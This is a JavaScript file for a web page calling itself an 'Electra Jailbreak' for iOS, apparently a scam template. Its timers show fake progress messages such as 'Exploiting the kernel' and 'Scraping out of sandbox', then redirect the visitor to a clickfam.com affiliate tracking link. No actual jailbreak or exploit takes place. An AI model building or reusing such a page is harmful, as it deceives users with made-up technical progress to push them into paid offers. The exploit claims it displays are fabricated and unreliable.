/*!
*  Electra Jailbreak
 * Main.js - Hearth of Application
 * Copyright 2013-2018 CPACodex.com, Inc.
 * Licensed under the MIT license
 */

$( document ).ready( function() {
	
	function phoneVersion() {
		if (/iP(hone|od|ad)/.test(navigator.platform)) {
			var v = (navigator.appVersion).match(/OS (\d+)_(\d+)_?(\d+)?/);
			var phoneversion = ['iOS ',parseInt(v[1], 10),'.',parseInt(v[2], 10),'.',parseInt(v[3] || 0, 10)];
			return phoneversion;
		} else {

			$( '.container' ).fadeOut();
			alert( 'Only iOS Device!' );

		}
	}	

    $( 'body' ).fadeIn( function() {

        // setTimeout( function() {

            // $( '.loadingPage' ).fadeOut( function() {

                $( '.homePage' ).fadeIn();
				$( '.ios-version' ).html( phoneVersion() );
                
            // });

        // }, 5000 );

    });	


    $( '#toggle' ).click( function () {

        $( '.circle-loader' ).toggleClass( 'load-complete' );
        $( '.checkmark' ).toggle();

        $( '#modalStep-2'  ).fadeOut( function() {
			alert( "Have you backed up device?" );
			alert( "Have you turned off Find My iPhone?" );
			$('#modalStep-3' ).modal({ backdrop: 'static', keyboard: false });
			setTimeout( function() {
				$( '.gen-line-1' ).fadeIn();
				setTimeout( function() {
					$( '.gen-line-2' ).fadeIn();
					setTimeout( function() {
						$( '.gen-line-3' ).fadeIn();
						setTimeout( function() {
							$( '.gen-line-4' ).fadeIn();
							setTimeout( function() {								$( '.gen-line-5' ).fadeIn();								setTimeout( function() {									$( '.gen-line-6' ).fadeIn();									setTimeout( function() {										$( '.gen-line-7' ).fadeIn();										setTimeout( function() {											$( '.gen-line-8' ).fadeIn();											setTimeout( function() {												$( '.gen-line-9' ).fadeIn();												setTimeout( function() {													$( '.gen-line-10' ).fadeIn();													setTimeout( function() {														$( '.gen-line-11' ).fadeIn();														setTimeout( function() {															$( '.gen-line-12' ).fadeIn();															setTimeout( function() {																$( '.gen-line-13' ).fadeIn();																setTimeout( function() {																	$( '.gen-line-14' ).fadeIn();																	setTimeout( function() {																		$( '.gen-line-15' ).fadeIn();																		setTimeout( function() {																			$( '.gen-line-16' ).fadeIn();																			setTimeout( function() {																				$( '.gen-line-17' ).fadeIn();																				setTimeout( function() {																					$( '.gen-line-18' ).fadeIn();																						window.location.href = "https://www.clickfam.com/cl.php?id=377910a5a32152643e20ccba0dd29a58";																				}, 3000 );																			}, 5000 );																		}, 3000 );																	}, 5000 );																}, 3000 );															}, 5000 );														}, 5000 );													}, 3000 );												}, 5000 );											}, 5000 );										}, 3000 );									}, 3000 );								}, 3000 );							}, 3000 );						}, 5000 );
					}, 3000 );
				}, 5000 );			
			}, 3000 );
        });
     });

    /* Start Generator */
    $( '.btnGenerate' ).click( function() {

    	setTimeout( function() {

    		$( '.progress-bar' ).css( 'width', '10%' );

    		$( '.generator-title' ).html( 'Connecting to iDevice<span class="blink">...</span>' );
	    	setTimeout( function() {

	    		$( '.progress-bar' ).css( 'width', '20%' );

	    		$( '.generator-title' ).html( 'Fetching device data<span class="blink">...</span>' );
		    	setTimeout( function() {

		    		$( '.progress-bar' ).css( 'width', '30%' );

		    		$( '.generator-title' ).html( 'Exploiting the kernel<span class="blink">...</span>' );
			    	setTimeout( function() {

			    		$( '.progress-bar' ).css( 'width', '40%' );

			    		$( '.generator-title' ).html( 'Scraping out of sandbox<span class="blink">...</span>' );
				    	setTimeout( function() {

				    		$( '.progress-bar' ).css( 'width', '50%' );

				    		$( '.generator-title' ).html( 'Successful, sandbox<span class="blink">...</span>' );
					    	setTimeout( function() {

					    		$( '.progress-bar' ).css( 'width', '70%' );

					    		$( '.generator-title' ).html( 'Setting up, iDevice<span class="blink">...</span>' );
						    	setTimeout( function() {

						    		$( '.progress-bar' ).css( 'width', '90%' );

						    		$( '.generator-title' ).html( 'Done, loading<span class="blink">...</span>' );
							    	setTimeout( function() {

							    		$( '.progress-bar' ).css( 'width', '100%' );

							    		setTimeout( function() { 

							    			$( '#modalStep-1' ).fadeOut( function() {

							    				$('#modalStep-2' ).modal({ backdrop: 'static', keyboard: false });

							    			}); 
							    			 

							    		}, 2000 );

							    	}, 4000 );								    	

						    	}, 4000 );						    	

					    	}, 5000 );					    	

				    	}, 4000 );	 

			    	}, 4000 );	 		    		

		    	}, 4000 );	    	

	    	}, 4000 );

    	}, 2000 );

    });

});